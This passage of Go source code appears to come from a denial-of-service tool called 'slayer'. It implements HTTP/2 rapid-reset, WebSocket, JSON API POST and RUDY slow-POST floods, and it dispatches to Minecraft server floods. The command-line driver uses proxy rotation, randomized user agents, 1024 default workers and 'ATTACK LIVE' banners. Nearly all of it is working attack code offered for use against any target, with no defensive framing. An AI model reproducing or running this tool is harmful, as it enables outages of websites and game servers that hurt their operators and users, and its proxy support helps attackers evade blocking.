		case <-connDone:
			return fmt.Errorf("connection closed by server")
		default:
		}

		for i := 0; i < batchSize; i++ {
			// Reset buffer
			hdrBuf.Reset()

			enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
			enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
			enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
			enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
			enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})

			if err := framer.WriteHeaders(http2.HeadersFrameParam{
				StreamID:      streamID,
				BlockFragment: hdrBuf.Bytes(),
				EndStream:     true,
				EndHeaders:    true,
			}); err != nil {
				return err
			}

			if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
				return err
			}

			totalSent.Add(1)
			streamID += 2

			if streamID >= 1<<31-1 {
				bw.Flush()
				return nil // stream IDs exhausted — worker will reconnect
			}
		}
		bw.Flush()
	}
}

// WebSocket Flood
func wsFlood(targetURL string, stop <-chan struct{}) error {
	// Convert http(s) to ws(s)
	wsURL := targetURL
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[7:]
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[8:]
	} else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		wsURL = "ws://" + wsURL
	}

	// Proxy setup
	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		var err error
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	if proxyURL != nil {
		dialer.Proxy = func(req *http.Request) (*url.URL, error) {
			return proxyURL, nil
		}
	}

	headers := http.Header{}
	headers.Set("User-Agent", randUA())
	headers.Set("Origin", targetURL)

	conn, _, err := dialer.Dial(wsURL, headers)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Drain incoming messages in background so pongs are handled
	go func() {
		for {
			if _, _, err := conn.ReadMessage(); err != nil {
				return
			}
		}
	}()

	// Flood: mix of text messages, binary junk, and pings
	for {
		select {
		case <-stop:
			conn.WriteMessage(websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			return nil
		default:
		}

		var err error
		switch int(rd.Int63n(5)) {
		case 0:
			// Text message — random string
			msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
				generateRandomString(8), generateRandomString(200+int(rd.Int63n(2000))), time.Now().UnixNano())
			err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
		case 1:
			// Binary junk — 1-8 KB
			data := make([]byte, 1024+int(rd.Int63n(7168)))
			crand.Read(data)
			err = conn.WriteMessage(websocket.BinaryMessage, data)
		case 2:
			// Ping flood
			err = conn.WriteMessage(websocket.PingMessage, []byte(generateRandomString(16)))
		case 3:
			// Large text — 10-50 KB of garbage
			err = conn.WriteMessage(websocket.TextMessage, []byte(generateRandomString(10240+int(rd.Int63n(40960)))))
		case 4:
			// Rapid small messages — burst 10 tiny frames
			for j := 0; j < 10; j++ {
				if e := conn.WriteMessage(websocket.TextMessage, []byte(generateRandomString(16))); e != nil {
					err = e
					break
				}
				totalSent.Add(1)
			}
		}

		if err != nil {
			return err // connection died — Worker will reconnect
		}
		totalSent.Add(1)
	}
}

// API/JSON POST Flood
var apiActions = []string{"update_profile", "create_post", "send_message", "add_comment", "upload_data", "sync", "process", "validate", "register", "checkout"}
var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit", "/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook"}

func genAPIPayload() string {
	generators := []func() string{
		// Profile update with huge bio
		func() string {
			bioLen := 2000 + int(rd.Int63n(8000))
			return fmt.Sprintf(
				`{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
				rd.Int63n(9999999), apiActions[int(rd.Int63n(int64(len(apiActions))))],
				generateRandomString(int(bioLen)), generateRandomString(32), generateRandomString(12+int(rd.Int63n(20))))
		},
		// Massive items array (500-5000 objects)
		func() string {
			var sb strings.Builder
			n := 500 + int(rd.Int63n(4500))
			sb.WriteString(`{"action":"bulk_insert","token":"`)
			sb.WriteString(generateRandomString(64))
			sb.WriteString(`","items":[`)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
					rd.Int63n(9999999), generateRandomString(8+int(rd.Int63n(16))), generateRandomString(20+int(rd.Int63n(100))))
			}
			sb.WriteString(`]}`)
			return sb.String()
		},
		// GraphQL-style query
		func() string {
			return fmt.Sprintf(
				`{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","notifications":%t,"data":"%s"}}}}`,
				rd.Int63n(9999999), generateRandomString(16), generateRandomString(3000+int(rd.Int63n(5000))),
				generateRandomString(8), generateRandomString(5), rd.Int63n(2) == 1, generateRandomString(1000+int(rd.Int63n(400))))
		},
		// Search/filter with many params
		func() string {
			var sb strings.Builder
			sb.WriteString(`{"action":"search","filters":{`)
			n := 20 + int(rd.Int63n(50))
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `"%s":"%s"`, generateRandomString(5+int(rd.Int63n(10))), generateRandomString(10+int(rd.Int63n(100))))
			}
			sb.WriteString(fmt.Sprintf(`},"page":%d,"limit":%d,"sort":"%s"}`,
				rd.Int63n(10000), 100+int(rd.Int63n(900)), generateRandomString(8)))
			return sb.String()
		},
	}
	return generators[int(rd.Int63n(int64(len(generators))))]()
}

func httpAPIFlood(targetURL string, client *http.Client) error {
	body := genAPIPayload()
	fullURL := targetURL + apiEndpoints[int(rd.Int63n(int64(len(apiEndpoints))))]

	req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", strconv.Itoa(len(body)))
	req.Header.Set("User-Agent", randUA())
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", generateRandomString(32))
	req.Header.Set("Authorization", "Bearer "+generateRandomString(64))
	req.Header.Set("Origin", targetURL)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		totalNonSucc.Add(1)
	}
	return nil
}

// RUDY (R U Dead Yet) — Slow POST
type slowReader struct {
	data  []byte
	pos   int
	delay time.Duration
	stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	default:
	}
	if r.pos >= len(r.data) {
		r.pos = 0 // Loop the payload to keep the connection open forever
	}
	p[0] = r.data[r.pos]
	r.pos++
	time.Sleep(r.delay)
	return 1, nil
}

func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error {
	declaredSize := 1024*1024 + int(rd.Int63n(50*1024*1024)) // 1-51 MB

	// Build a small payload chunk to drip slowly
	chunk := []byte("comment=" + generateRandomString(50) + "&" + generateRandomString(10) + "=" + generateRandomString(20) + "&")

	slow := &slowReader{
		data:  chunk,
		delay: time.Duration(500+int(rd.Int63n(2000))) * time.Millisecond, // 0.5-2.5s per byte
		stop: stop,
	}

	req, err := http.NewRequest("POST", targetURL, slow)
	if err != nil {
		return err
	}
	req.ContentLength = int64(declaredSize)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randUA())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	// Use a long-timeout client for RUDY — we WANT the connection to stay open
	rudyClient := *client
	rudyClient.Timeout = 0 // no timeout — drip until stopped
	if t, ok := rudyClient.Transport.(*http.Transport); ok {
		tClone := t.Clone()
		tClone.ResponseHeaderTimeout = 0
		tClone.IdleConnTimeout = 0
		rudyClient.Transport = tClone
	}

	resp, err := rudyClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

// Worker function
func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
	client := clients[id%len(clients)]
	for {
		select {
		case <-stop:
			return
		default:
		}

		var err error
		switch strings.ToLower(method) {
		case "httpget":
			err = httpGet(targetURL, client)
		case "httppost":
			err = httpPost(targetURL, client)
		case "rudy":
			err = httpRudy(targetURL, client, stop)
		case "apiflood":
			err = httpAPIFlood(targetURL, client)
		case "rapidreset":
			err = httpRapidReset(targetURL, stop)
		case "wsflood":
			err = wsFlood(targetURL, stop)
		case "slowloris":
			err = httpSlowloris(targetURL, client, stop)
		case "mc-handshake":
			fallthrough
		case "mc_handshake":
			err = mcHandshakeFlood(targetURL, client, stop)
		case "mc-status":
			fallthrough
		case "mc_status":
			err = mcStatusPingFlood(targetURL, client, stop)
		case "mc-login":
			fallthrough
		case "mc_login":
			err = mcLoginFlood(targetURL, client, stop)
		case "mc-chat":
			fallthrough
		case "mc_chat":
			err = mcChatFlood(targetURL, client, stop)
		case "mc-keepalive":
			fallthrough
		case "mc_keepalive":
			err = mcKeepAliveFlood(targetURL, client, stop)
		case "mc-compression":
			fallthrough
		case "mc_compression":
			err = mcCompressionBomb(targetURL, client, stop)
		case "mc-joingame":
			fallthrough
		case "mc_joingame":
			err = mcJoinGameFlood(targetURL, client, stop)
		default:
			fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
			os.Exit(1)
		}

		if err != nil {
			totalErrors.Add(1)
			if verbose {
				fmt.Fprintf(os.Stderr, "[worker %d] %v\n", id, err)
			}
			continue
		}
		if rateMS > 0 {
			time.Sleep(time.Duration(rateMS) * time.Millisecond)
		}
	}
}

func main() {
	target := flag.String("t", "", "target URL (e.g. http://1.2.3.4 or minecraft://1.2.3.4:25565)")
	method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, mc-handshake, mc-status, mc-login, mc-chat, mc-keepalive, mc-compression, mc-joingame")
	workerCount := flag.Int("w", 1024, "number of workers")
	dur := flag.Int("d", 30, "duration in seconds")
	pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
	verbose := flag.Bool("v", false, "print request errors to stderr")
	rateDelay := flag.Int("r", 0, "delay in ms between requests per worker (0 = unlimited)")
	flag.Parse()

	if *target == "" {
		fmt.Println(`
  ______   __                                                 ______
 /      \ | \                                         /      \
|  $$$$$$\| $$  ______   __    __   ______    ______        |  $$$$$$\ __     __  _______
| $$___\$$| $$ |      \ |  \  |  \ /      \  /      \       | $$___\$$|  \   /  \|       \
 \$$    \ | $$  \$$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\       \$$    \  \$$\ /  $$| $$$$$$$
 _\$$$$$$\| $$ /      $$| $$ | $$| $$    $$| $$   \$$       _\$$$$$$\  \$$\  $$ | $$  | $$
|  \__| $$| $$|  $$$$$$$| $$__/ $$| $$$$$$$$| $$            |  \__| $$   \$$ $$  | $$  | $$
 \$$    $$| $$ \$$    $$ \$$    $$ \$$     \| $$             \$$    $$    \$$$   | $$  | $$
  \$$$$$$  \$$  \$$$$$$$ _\$$$$$$$  \$$$$$$$ \$$              \$$$$$$      \$     \$$   \$$
                        |  \__| $$
                         \$$    $$
                          \$$$$$$`)
		fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
		fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | mc-handshake | mc-status | mc-login | mc-chat | mc-keepalive | mc-compression | mc-joingame")
		fmt.Println()
		flag.PrintDefaults()
		os.Exit(1)
	}

	targetURL := *target
	workers := *workerCount
	duration := *dur
	proxyFile := *pFile

	// Validate method
	validMethods := map[string]bool{
		"httpget": true, "httppost": true, "rudy": true,
		"apiflood": true, "rapidreset": true, "wsflood": true,
		"slowloris": true,
		"mc-handshake": true, "mc-status": true, "mc-login": true,
		"mc-chat": true, "mc-keepalive": true, "mc-compression": true,
		"mc-joingame": true,
	}
	if !validMethods[strings.ToLower(*method)] {
		fmt.Fprintf(os.Stderr, "\n  ✗ Unknown method: %s\n", *method)
		fmt.Fprintf(os.Stderr, "  Valid methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris\n")
		fmt.Fprintf(os.Stderr, "                 mc-handshake | mc-status | mc-login | mc-chat | mc-keepalive | mc-compression | mc-joingame\n\n")
		os.Exit(1)
	}
	if workers < 1 {
		fmt.Fprintf(os.Stderr, "\n  ✗ -w must be >= 1\n\n")
		os.Exit(1)
	}
	if duration < 1 {
		fmt.Fprintf(os.Stderr, "\n  ✗ -d must be >= 1\n\n")
		os.Exit(1)
	}

	{
		parsedTarget, err := url.Parse(targetURL)
		if err != nil || (parsedTarget.Scheme != "http" && parsedTarget.Scheme != "https") {
			fmt.Fprintf(os.Stderr, "\n  ✗ target must start with http:// or https://\n\n")
			os.Exit(1)
		}
	}

	// ANSI color codes
	const (
		reset   = "\033[0m"
		red     = "\033[31m"
		green   = "\033[32m"
		yellow  = "\033[33m"
		cyan    = "\033[36m"
		magenta = "\033[35m"
		bold    = "\033[1m"
		dim     = "\033[2m"
	)

	// Clear screen + banner
	fmt.Print("\033[2J\033[H")
	fmt.Println(red + bold + `
 ______   __               ______
 /      \ |  \       /      \
|  $$$$$$\| $$  ______   __    __   ______    ______        | $$$$$$\ __     __  _______
| $$___\$$| $$ |      \ |  \  |  \ /      \  /      \       | $$___\$$|  \   /  \|   \
 \$$    \ | $$  \$$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\       \$$    \  \$$\ /  $$| $$$$$$$
 _\$$$$$$\| $$ /      $$| $$  | $$| $$    $$| $$   \$$       _\$$$$$$\  \$$\  $$ | $$  | $$
|  \__| $$| $$|  $$$$$$$| $$__/ $$| $$$$$$$$| $$            |  \__| $$   \$$ $$  | $$  | $$
 \$$    $$| $$ \$$    $$ \$$    $$ \$$     \| $$             \$$    $$    \$$$   | $$  | $$
  \$$$$$$  \$$  \$$$$$$$ _\$$$$$$$  \$$$$$$$ \$$              \$$$$$$      \$     \$$   \$$
                        |  \__| $$
               \$$    $$
                          \$$$$$$
                        |  \__| $$
                         \$$    $$
                          \$$$$$$`)
	fmt.Println()

	// Config box with colors
	fmt.Println(dim + "  ┌─────────────────────────────────────────┐" + reset)
	fmt.Println(dim + "  │" + bold + cyan + "         ATTACK CONFIGURATION            " + reset + dim + "│" + reset)
	fmt.Println(dim + "  ├─────────────────────────────────────────┤" + reset)
	fmt.Printf(dim+"  │"+reset+" "+red+"TARGET"+reset+"   %-32s"+dim+"│"+reset+"\n", targetURL)
	fmt.Printf(dim+"  │"+reset+" "+magenta+"METHOD"+reset+"   %-32s"+dim+"│"+reset+"\n", strings.ToUpper(*method))
	fmt.Printf(dim+"  │"+reset+" "+yellow+"WORKERS"+reset+"  %-32d"+dim+"│"+reset+"\n", workers)
	fmt.Printf(dim+"  │"+reset+" "+cyan+"DURATION"+reset+" %-32s"+dim+"│"+reset+"\n", fmt.Sprintf("%ds", duration))
	proxyLabel := "DIRECT"
	if proxyFile != "" {
		proxyLabel = proxyFile
	}
	fmt.Printf(dim+"  │"+reset+" "+green+"PROXIES"+reset+"  %-32s"+dim+"│"+reset+"\n", proxyLabel)
	fmt.Println(dim + "  └─────────────────────────────────────────┘" + reset)
	fmt.Println()

	frames := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	spinIdx := 0

	// Methods that do raw TCP/TLS dialing and don't use http.Client pool
	needsClientPool := true
	switch strings.ToLower(*method) {
	case "rapidreset", "wsflood", "mc-handshake", "mc-status", "mc-login", "mc-chat", "mc-keepalive", "mc-compression", "mc-joingame":
		needsClientPool = false
	}

	var clients []*http.Client

	if proxyFile != "" {
		if _, err := os.Stat(proxyFile); err != nil {
			fmt.Fprintf(os.Stderr, "\n  ✗ proxy file not found: %s\n\n", proxyFile)
			os.Exit(1)
		}
		// Proxied mode — load proxies once
		done := make(chan []string)
		go func() {
			proxies, err := loadProxies(proxyFile)
			if err != nil {
				log.Fatalf(red + "  ✗ " + reset + "failed to load proxies: " + err.Error())
			}
			done <- proxies
		}()

		var proxies []string
	spinLoop:
		for {
			select {
			case proxies = <-done:
				break spinLoop
			default:
				fmt.Printf("\r  %s%s%s Loading proxies...  ", yellow, frames[spinIdx%len(frames)], reset)
				spinIdx++
				time.Sleep(80 * time.Millisecond)
			}
		}
		proxyList = proxies
		fmt.Printf("\r  %s✓%s Loaded %s%d%s proxies                \n", green, reset, bold, len(proxies), reset)

		if needsClientPool {
			done2 := make(chan []*http.Client)
			go func() {
				c, err := buildClientPool(proxies, workers)
				if err != nil {
					log.Fatalf(red + "  ✗ " + reset + "failed to build client pool: " + err.Error())
				}
				done2 <- c
			}()
			spinIdx = 0
		spinLoop2:
			for {
				select {
				case clients = <-done2:
					break spinLoop2
				default:
					fmt.Printf("\r  %s%s%s Building client pool...  ", yellow, frames[spinIdx%len(frames)], reset)
					spinIdx++
					time.Sleep(80 * time.Millisecond)
				}
			}
			fmt.Printf("\r  %s✓%s Built %s%d%s proxy clients            \n", green, reset, bold, len(clients), reset)
		} else {
			fmt.Printf("  %s✓%s Skipped client pool (%s uses raw connections)\n", green, reset, strings.ToUpper(*method))
		}
	} else {
		// Direct mode — scale pool with worker count
		if needsClientPool {
			poolSize := workers / 8
			if poolSize < 4 {
				poolSize = 4
			}
			if poolSize > maxDirectPool {
				poolSize = maxDirectPool
			}
			fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
			clients = buildDirectPool(poolSize)
			fmt.Printf("  %s✓%s Built %s%d%s direct clients            \n", green, reset, bold, poolSize, reset)
		} else {
			fmt.Printf("  %s✓%s Direct mode (no proxies)\n", green, reset)
			fmt.Printf("  %s✓%s Skipped client pool (%s uses raw connections)\n", green, reset, strings.ToUpper(*method))
		}
	}
	fmt.Println()

	// Countdown
	for i := 3; i >= 1; i-- {
		fmt.Printf("\r  %s%s⚡ Launching in %d...%s  ", bold, red, i, reset)
		time.Sleep(700 * time.Millisecond)
	}
	fmt.Printf("\r  %s%s⚡ ATTACK LIVE              %s\n\n", bold, red, reset)

	stop := make(chan struct{})

	// For methods that skip the client pool, provide a single dummy client
	// so Worker doesn't index into a nil slice.
	if clients == nil {
		clients = []*http.Client{{}}
	}

	for i := 0; i < workers; i++ {
		go Worker(i, targetURL, *method, clients, stop, *verbose, *rateDelay)
	}

	fmt.Printf("  %s%s▸%s %s%d%s workers launched → %s%s%s for %s%ds%s\n",
		bold, green, reset, bold, workers, reset,
		cyan, strings.ToUpper(*method), reset,
		yellow, duration, reset)

	// Live stats ticker
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	start := time.Now()

	go func() {
		for range ticker.C {
			elapsed := time.Since(start).Seconds()
			sent := totalSent.Load()
			errs := totalErrors.Load()
			nonSucc := totalNonSucc.Load()
			rps := float64(sent) / elapsed
			errColor := green
			if errs > 0 {
				errColor = red
			}
			nonSuccColor := green
			if nonSucc > 0 {
				nonSuccColor = yellow
			}
			fmt.Printf("\r  %s[%.0fs]%s Sent: %s%d%s │ Non-2xx: %s%d%s │ Errors: %s%d%s │ RPS: %s%.0f%s   ",
				dim, elapsed, reset,
				bold+green, sent, reset,
				bold+nonSuccColor, nonSucc, reset,
				bold+errColor, errs, reset,
				bold+cyan, rps, reset)
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)

	sent := totalSent.Load()
	errs := totalErrors.Load()
	nonSuccFinal := totalNonSucc.Load()
	avgRPS := float64(sent) / float64(duration)
	fmt.Println()
	fmt.Println()
	fmt.Println(dim + "  ┌─────────────────────────────────────────┐" + reset)
	fmt.Println(dim + "  │" + bold + red + "         ATTACK COMPLETE              " + reset + dim + "│" + reset)
	fmt.Println(dim + "  ├─────────────────────────────────────────┤" + reset)
	fmt.Printf(dim+"  │"+reset+" "+green+"SENT"+reset+"     %-34d"+dim+"│"+reset+"\n", sent)
	fmt.Printf(dim+"  │"+reset+" "+yellow+"NON-2XX"+reset+"  %-34d"+dim+"│"+reset+"\n", nonSuccFinal)
	fmt.Printf(dim+"  │"+reset+" "+red+"ERRORS"+reset+"   %-34d"+dim+"│"+reset+"\n", errs)
	fmt.Printf(dim+"  │"+reset+" "+cyan+"AVG RPS"+reset+"  %-34.0f"+dim+"│"+reset+"\n", avgRPS)
	fmt.Printf(dim+"  │"+reset+" "+yellow+"DURATION"+reset+" %-34s"+dim+"│"+reset+"\n", fmt.Sprintf("%ds", duration))
	fmt.Println(dim + "  └─────────────────────────────────────────┘" + reset)
	fmt.Println()
}
